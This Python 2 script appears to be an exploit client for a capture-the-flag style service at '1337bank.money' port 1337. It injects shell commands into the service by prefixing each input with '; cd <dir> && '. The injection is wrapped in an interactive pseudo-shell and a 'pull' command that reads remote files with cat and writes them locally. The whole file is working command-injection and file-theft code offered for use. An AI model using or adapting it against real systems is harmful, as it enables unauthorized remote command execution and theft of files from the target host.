import socket

host = "1337bank.money"
port = 1337

def execute_cmd(directory, cmd):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    data = s.recv(1024)

    s.send("; cd " + directory + " && " + cmd + "\n")

    data = s.recv(1024)
    data = s.recv(1024)
    #trim data
    
    s.close()
    return data

def shell(): 
    directory = "/"

    while(1 == 1):

        usrInput = raw_input(directory + ">")

        if usrInput == "exit":
            break

        toScreen = execute_cmd(directory, usrInput)

        print(toScreen + "\n")

        if usrInput[:3] == "cd ":
            directory += usrInput[3:]

def start():
    
    helpMsg = "shell: Drop into an interative shell and allow users to exit\npull <remote-path> <local-path>: Download files\nhelp: shows help menu\nquit: Quit the shell\n"

    while(1 == 1):

        usrString = raw_input("Enter a command: ")
        
        if usrString == "shell":
            shell()
        elif usrString[: 5] == "pull ":
            words = usrString.split()
            fromfile = words[1]
            tofile = words[2]
            cmd = "cat " + fromfile

            data = execute_cmd("/", cmd)

            f = open(tofile, 'w')
            f.write(data)
            f.close()

            print("copied filed\n")
        elif usrString == "help":
            print(helpMsg)
        elif usrString == "quit":
            break
        else:
            print(helpMsg)



if __name__ == '__main__':
    start()
